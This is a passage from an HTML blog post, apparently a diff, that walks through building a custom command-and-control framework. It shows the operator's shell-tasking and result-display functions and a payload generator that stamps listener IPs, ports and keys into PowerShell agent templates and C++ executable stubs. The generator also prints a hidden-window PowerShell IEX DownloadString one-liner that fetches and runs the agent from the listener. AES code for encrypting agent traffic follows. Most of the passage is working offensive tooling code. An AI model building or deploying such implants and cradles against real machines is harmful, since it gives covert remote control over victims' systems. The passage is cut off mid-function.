+    <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">Path</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+        <span class="n">os</span><span class="p">.</span><span class="n">mkdir</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">Path</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The remaining functions are wrappers that rely on these functions or helper functions that rely on the wrappers. One example is the <code class="language-plaintext highlighter-rouge">shell</code> function which just takes the command and writes the task:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">shell</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+    
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">error</span><span class="p">(</span><span class="s">"Missing command."</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="s">" "</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
+        <span class="n">task</span>    <span class="o">=</span> <span class="s">"shell "</span> <span class="o">+</span> <span class="n">command</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">writeTask</span><span class="p">(</span><span class="n">task</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The last function I want to talk about is a helper function called <code class="language-plaintext highlighter-rouge">displayResults</code> which takes the sent results and the agent name. If the agent is a <code class="language-plaintext highlighter-rouge">powershell</code> agent it decrypts the results and checks their validity then prints them, otherwise it will just print the results:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">displayResults</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">result</span><span class="p">):</span>
+
+    <span class="k">if</span> <span class="n">isValidAgent</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="bp">True</span><span class="p">:</span>
+
+        <span class="k">if</span> <span class="n">result</span> <span class="o">==</span> <span class="s">""</span><span class="p">:</span>
+            <span class="n">success</span><span class="p">(</span><span class="s">"Agent {} completed task."</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
+        <span class="k">else</span><span class="p">:</span>
+            
+            <span class="n">key</span> <span class="o">=</span> <span class="n">agents</span><span class="p">[</span><span class="n">name</span><span class="p">].</span><span class="n">key</span>
+            
+            <span class="k">if</span> <span class="n">agents</span><span class="p">[</span><span class="n">name</span><span class="p">].</span><span class="n">Type</span> <span class="o">==</span> <span class="s">"p"</span><span class="p">:</span>
+
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">DECRYPT</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+                <span class="k">except</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="mi">0</span>
+            
+                <span class="k">if</span> <span class="n">plaintext</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="s">"VALID"</span><span class="p">:</span>
+                    <span class="n">success</span><span class="p">(</span><span class="s">"Agent {} returned results:"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
+                    <span class="k">print</span><span class="p">(</span><span class="n">plaintext</span><span class="p">[</span><span class="mi">6</span><span class="p">:])</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="mi">0</span>
+            
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">success</span><span class="p">(</span><span class="s">"Agent {} returned results:"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
+                <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="payloads-generator">Payloads Generator</h2>
+
+<p>Any c2 server would be able to generate payloads for active listeners, as seen earlier in the agents part, we only need to change the <code class="language-plaintext highlighter-rouge">IP</code> address, port and key in the agent template, or just the <code class="language-plaintext highlighter-rouge">IP</code> address and port in case of the <code class="language-plaintext highlighter-rouge">c++</code> agent.<br></p>
+
+<h3 id="powershell">PowerShell</h3>
+
+<p>Doing this with the <code class="language-plaintext highlighter-rouge">powershell</code> agent is simple because a <code class="language-plaintext highlighter-rouge">powershell</code> script is just a text file so we just need to replace the strings <code class="language-plaintext highlighter-rouge">REPLACE_IP</code>, <code class="language-plaintext highlighter-rouge">REPLACE_PORT</code> and <code class="language-plaintext highlighter-rouge">REPLACE_KEY</code>.<br></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">powershell</code> function takes a listener name, and an output name. It grabs the needed options from the listener then it replaces the needed strings in the <code class="language-plaintext highlighter-rouge">powershell</code> template and saves the new file in two places, <code class="language-plaintext highlighter-rouge">/tmp/</code> and the files path for the listener. After doing that it generates a download cradle that requests <code class="language-plaintext highlighter-rouge">/sc/</code> (the endpoint discussed in the listeners part).<br></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">powershell</span><span class="p">(</span><span class="n">listener</span><span class="p">,</span> <span class="n">outputname</span><span class="p">):</span>
+    
+    <span class="n">outpath</span> <span class="o">=</span> <span class="s">"/tmp/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">outputname</span><span class="p">)</span>
+    <span class="n">ip</span>      <span class="o">=</span> <span class="n">listeners</span><span class="p">[</span><span class="n">listener</span><span class="p">].</span><span class="n">ipaddress</span>
+    <span class="n">port</span>    <span class="o">=</span> <span class="n">listeners</span><span class="p">[</span><span class="n">listener</span><span class="p">].</span><span class="n">port</span>
+    <span class="n">key</span>     <span class="o">=</span> <span class="n">listeners</span><span class="p">[</span><span class="n">listener</span><span class="p">].</span><span class="n">key</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"./lib/templates/powershell.ps1"</span><span class="p">,</span> <span class="s">"rt"</span><span class="p">)</span> <span class="k">as</span> <span class="n">p</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'REPLACE_IP'</span><span class="p">,</span><span class="n">ip</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'REPLACE_PORT'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'REPLACE_KEY'</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">outpath</span><span class="p">,</span> <span class="s">"wt"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"{}{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">listeners</span><span class="p">[</span><span class="n">listener</span><span class="p">].</span><span class="n">filePath</span><span class="p">,</span> <span class="n">outputname</span><span class="p">),</span> <span class="s">"wt"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">oneliner</span> <span class="o">=</span> <span class="s">"powershell.exe -nop -w hidden -c </span><span class="se">\"</span><span class="s">IEX(New-Object Net.WebClient).DownloadString(</span><span class="se">\'</span><span class="s">http://{}:{}/sc/{}</span><span class="se">\'</span><span class="s">)</span><span class="se">\"</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">),</span> <span class="n">outputname</span><span class="p">)</span>
+
+    <span class="n">success</span><span class="p">(</span><span class="s">"File saved in: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">outpath</span><span class="p">))</span>
+    <span class="n">success</span><span class="p">(</span><span class="s">"One liner: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">oneliner</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h3 id="windows-executable-c-agent">Windows Executable (C++ Agent)</h3>
+
+<p>It wasn’t as easy as it was with the <code class="language-plaintext highlighter-rouge">powershell</code> agent, because the <code class="language-plaintext highlighter-rouge">c++</code> agent would be a compiled PE executable.<br></p>
+
+<p>It was a huge problem and I spent a lot of time trying to figure out what to do, that was when I was introduced to the idea of a stub.<br></p>
+
+<p>The idea is to append whatever data that needs to be dynamically assigned to the executable, and design the program in a way that it reads itself and pulls out the appended information.<br></p>
+
+<p>In the source of the agent I added a few lines of code that do the following:</p>
+
+<ul>
+  <li>Open the file as a file stream.</li>
+  <li>Move to the end of the file.</li>
+  <li>Read 2 lines.</li>
+  <li>Save the first line in the <code class="language-plaintext highlighter-rouge">IP</code> variable.</li>
+  <li>Save the second line in the port variable.</li>
+  <li>Close the file stream.</li>
+</ul>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">std</span><span class="o">::</span><span class="n">ifstream</span> <span class="nf">ifs</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+	
+<span class="n">ifs</span><span class="p">.</span><span class="n">seekg</span><span class="p">(</span><span class="n">TEMPLATE_EOF</span><span class="p">);</span>
+	
+<span class="n">std</span><span class="o">::</span><span class="n">getline</span><span class="p">(</span><span class="n">ifs</span><span class="p">,</span> <span class="n">ip</span><span class="p">);</span>
+<span class="n">std</span><span class="o">::</span><span class="n">getline</span><span class="p">(</span><span class="n">ifs</span><span class="p">,</span> <span class="n">sPort</span><span class="p">);</span>
+
+<span class="n">ifs</span><span class="p">.</span><span class="n">close</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p>To get the right <code class="language-plaintext highlighter-rouge">EOF</code> I had to compile the agent first, then update the agent source and compile again according to the size of the file.<br></p>
+
+<p>For example this is the current definition of <code class="language-plaintext highlighter-rouge">TEMPLATE_EOF</code> for the <code class="language-plaintext highlighter-rouge">x64</code> agent:</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define TEMPLATE_EOF 52736
+</span></code></pre></div></div>
+
+<p>If we take a look at the size of the file we’ll find that it’s the same:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ls -la
+-rwxrwxr-x 1 ... ... 52736 ... ... ... winexe64.exe
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">winexe</code> function takes a listener name, an architecture and an output name, grabs the needed options from the listener and appends them to the template corresponding to the selected architecture and saves the new file in <code class="language-plaintext highlighter-rouge">/tmp</code>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">winexe</span><span class="p">(</span><span class="n">listener</span><span class="p">,</span> <span class="n">arch</span><span class="p">,</span> <span class="n">outputname</span><span class="p">):</span>
+
+    <span class="n">outpath</span> <span class="o">=</span> <span class="s">"/tmp/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">outputname</span><span class="p">)</span>
+    <span class="n">ip</span>      <span class="o">=</span> <span class="n">listeners</span><span class="p">[</span><span class="n">listener</span><span class="p">].</span><span class="n">ipaddress</span>
+    <span class="n">port</span>    <span class="o">=</span> <span class="n">listeners</span><span class="p">[</span><span class="n">listener</span><span class="p">].</span><span class="n">port</span>
+
+    <span class="k">if</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">"x64"</span><span class="p">:</span>
+        <span class="n">copyfile</span><span class="p">(</span><span class="s">"./lib/templates/winexe/winexe64.exe"</span><span class="p">,</span> <span class="n">outpath</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">"x32"</span><span class="p">:</span>
+        <span class="n">copyfile</span><span class="p">(</span><span class="s">"./lib/templates/winexe/winexe32.exe"</span><span class="p">,</span> <span class="n">outpath</span><span class="p">)</span>        
+    
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">outpath</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"{}</span><span class="se">\n</span><span class="s">{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
+
+    <span class="n">success</span><span class="p">(</span><span class="s">"File saved in: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">outpath</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h2 id="encryption">Encryption</h2>
+
+<p>I’m not very good at cryptography so this part was the hardest of all. At first I wanted to use <code class="language-plaintext highlighter-rouge">AES</code> and do Diffie-Hellman  key exchange between the server and the agent. However I found that <code class="language-plaintext highlighter-rouge">powershell</code> can’t deal with big integers without the <code class="language-plaintext highlighter-rouge">.NET</code> class <code class="language-plaintext highlighter-rouge">BigInteger</code>, and because I’m not sure that the class would be always available I gave up the idea and decided to hardcode the key while generating the payload because I didn’t want to risk the compatibility of the agent. I could use <code class="language-plaintext highlighter-rouge">AES</code> in <code class="language-plaintext highlighter-rouge">powershell</code> easily, however I couldn’t do the same in <code class="language-plaintext highlighter-rouge">c++</code>, so I decided to use a simple <code class="language-plaintext highlighter-rouge">xor</code> but again there were some issues, that’s why the <code class="language-plaintext highlighter-rouge">winexe</code> agent won’t be using any encryption until I figure out what to do.<br></p>
+
+<p>Let’s take a look at the crypto functions in both the server and the <code class="language-plaintext highlighter-rouge">powershell</code> agent.<br></p>
+
+<h3 id="server">Server</h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">AESCipher</code> class uses the <code class="language-plaintext highlighter-rouge">AES</code> class from the <code class="language-plaintext highlighter-rouge">pycrypto</code> library, it uses <code class="language-plaintext highlighter-rouge">AES CBC 256</code>.<br></p>
+
+<p>An <code class="language-plaintext highlighter-rouge">AESCipher</code> object is instantiated with a key, it expects the key to be <code class="language-plaintext highlighter-rouge">base-64</code> encoded:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">AESCipher</span><span class="p">:</span>
+    
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+
+        <span class="bp">self</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">bs</span>  <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">block_size</span>
+</code></pre></div></div>
+
+<p>There are two functions to pad and unpad the text with zeros to match the block size:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">s</span> <span class="o">+</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">bs</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">%</span> <span class="bp">self</span><span class="p">.</span><span class="n">bs</span><span class="p">)</span> <span class="o">*</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span>
+
+<span class="k">def</span> <span class="nf">unpad</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">s</span><span class="p">):</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The encryption function takes plain text, pads it, creates a random <code class="language-plaintext highlighter-rouge">IV</code>, encrypts the plain text and returns the <code class="language-plaintext highlighter-rouge">IV</code> + the cipher text <code class="language-plaintext highlighter-rouge">base-64</code> encoded:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">raw</span><span class="p">):</span>
+    
+    <span class="n">raw</span>      <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">pad</span><span class="p">(</span><span class="n">raw</span><span class="p">)</span>
+    <span class="n">iv</span>       <span class="o">=</span> <span class="n">Random</span><span class="p">.</span><span class="n">new</span><span class="p">().</span><span class="n">read</span><span class="p">(</span><span class="n">AES</span><span class="p">.</span><span class="n">block_size</span><span class="p">)</span>
+    <span class="n">cipher</span>   <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+    
+    <span class="k">return</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">iv</span> <span class="o">+</span> <span class="n">cipher</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">raw</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">)))</span>
+</code></pre></div></div>
+
+<p>The decryption function does the opposite:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">enc</span><span class="p">):</span>
+    
+    <span class="n">enc</span>      <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
+    <span class="n">iv</span>       <span class="o">=</span> <span class="n">enc</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span>
+    <span class="n">cipher</span>   <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+    <span class="n">plain</span>    <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">enc</span><span class="p">[</span><span class="mi">16</span><span class="p">:])</span>
+    <span class="n">plain</span>    <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">unpad</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span>
+    
+    <span class="k">return</span> <span class="n">plain</span> 
+</code></pre></div></div>
+
+<p>I created two wrapper function that rely on the <code class="language-plaintext highlighter-rouge">AESCipher</code> class to encrypt and decrypt data:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">ENCRYPT</span><span class="p">(</span><span class="n">PLAIN</span><span class="p">,</span> <span class="n">KEY</span><span class="p">):</span>
+
+    <span class="n">c</span>   <span class="o">=</span> <span class="n">AESCipher</span><span class="p">(</span><span class="n">KEY</span><span class="p">)</span>
+    <span class="n">enc</span> <span class="o">=</span> <span class="n">c</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">PLAIN</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">enc</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">DECRYPT</span><span class="p">(</span><span class="n">ENC</span><span class="p">,</span> <span class="n">KEY</span><span class="p">):</span>
+
+    <span class="n">c</span>   <span class="o">=</span> <span class="n">AESCipher</span><span class="p">(</span><span class="n">KEY</span><span class="p">)</span>
+    <span class="n">dec</span> <span class="o">=</span> <span class="n">c</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ENC</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">dec</span>
+</code></pre></div></div>
+
+<p>And finally there’s the <code class="language-plaintext highlighter-rouge">generateKey</code> function which creates a random 32 bytes key and <code class="language-plaintext highlighter-rouge">base-64</code> encodes it:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">generateKey</span><span class="p">():</span>
+
+    <span class="n">key</span>    <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">key</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="powershell-agent-1">PowerShell Agent</h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">powershell</code> agent uses the <code class="language-plaintext highlighter-rouge">.NET</code> class <code class="language-plaintext highlighter-rouge">System.Security.Cryptography.AesManaged</code>.<br></p>
+
+<p>First function is the <code class="language-plaintext highlighter-rouge">Create-AesManagedObject</code> which instantiates an <code class="language-plaintext highlighter-rouge">AesManaged</code> object using the given key and <code class="language-plaintext highlighter-rouge">IV</code>. It’s a must to use the same options we decided to use on the server side which are <code class="language-plaintext highlighter-rouge">CBC</code> mode, zeros padding and 32 bytes key length:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">function</span><span class="w"> </span><span class="nf">Create-AesManagedObject</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span><span class="w"> </span><span class="nv">$IV</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    
+    </span><span class="nv">$aesManaged</span><span class="w">           </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="s2">"System.Security.Cryptography.AesManaged"</span><span class="w">
+    </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">Mode</span><span class="w">      </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Security.Cryptography.CipherMode</span><span class="p">]::</span><span class="n">CBC</span><span class="w">
+    </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">Padding</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Security.Cryptography.PaddingMode</span><span class="p">]::</span><span class="n">Zeros</span><span class="w">
+    </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">BlockSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">128</span><span class="w">
+    </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">KeySize</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="mi">256</span><span class="w">
+</span></code></pre></div></div>
+
+<p>After that it checks if the provided key and <code class="language-plaintext highlighter-rouge">IV</code> are of the type <code class="language-plaintext highlighter-rouge">String</code> (which means that the key or the <code class="language-plaintext highlighter-rouge">IV</code> is <code class="language-plaintext highlighter-rouge">base-64</code> encoded), depending on that it decodes the data before using them, then it returns the <code class="language-plaintext highlighter-rouge">AesManaged</code> object.<br></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$IV</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+        
+        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$IV</span><span class="o">.</span><span class="nf">getType</span><span class="p">()</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"String"</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">IV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$IV</span><span class="p">)</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+        
+        </span><span class="kr">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">IV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$IV</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+    
+    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+        
+        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$key</span><span class="o">.</span><span class="nf">getType</span><span class="p">()</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"String"</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">Key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+        
+        </span><span class="kr">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">Key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$key</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+    
+    </span><span class="nv">$aesManaged</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">Encrypt</code> function takes a key and a plain text string, converts that string to bytes, then it uses the <code class="language-plaintext highlighter-rouge">Create-AesManagedObject</code> function to create the <code class="language-plaintext highlighter-rouge">AesManaged</code> object and it encrypts the string with a random generated <code class="language-plaintext highlighter-rouge">IV</code>.<br></p>
+
+<p>It returns the cipher text <code class="language-plaintext highlighter-rouge">base-64</code> encoded.<br></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">function</span><span class="w"> </span><span class="nf">Encrypt</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span><span class="w"> </span><span class="nv">$unencryptedString</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    
+    </span><span class="nv">$bytes</span><span class="w">             </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetBytes</span><span class="p">(</span><span class="nv">$unencryptedString</span><span class="p">)</span><span class="w">
+    </span><span class="nv">$aesManaged</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="n">Create-AesManagedObject</span><span class="w"> </span><span class="nv">$key</span><span class="w">
+    </span><span class="nv">$encryptor</span><span class="w">         </span><span class="o">=</span><span class="w"> </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">CreateEncryptor</span><span class="p">()</span><span class="w">
+    </span><span class="nv">$encryptedData</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="nv">$encryptor</span><span class="o">.</span><span class="nf">TransformFinalBlock</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$bytes</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
+    </span><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$fullData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">IV</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$encryptedData</span><span class="w">
+    </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">Dispose</span><span class="p">()</span><span class="w">
+    </span><span class="p">[</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$fullData</span><span class="p">)</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The opposite of this process happens with the <code class="language-plaintext highlighter-rouge">Decrypt</code> function:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">function</span><span class="w"> </span><span class="nf">Decrypt</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span><span class="w"> </span><span class="nv">$encryptedStringWithIV</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    
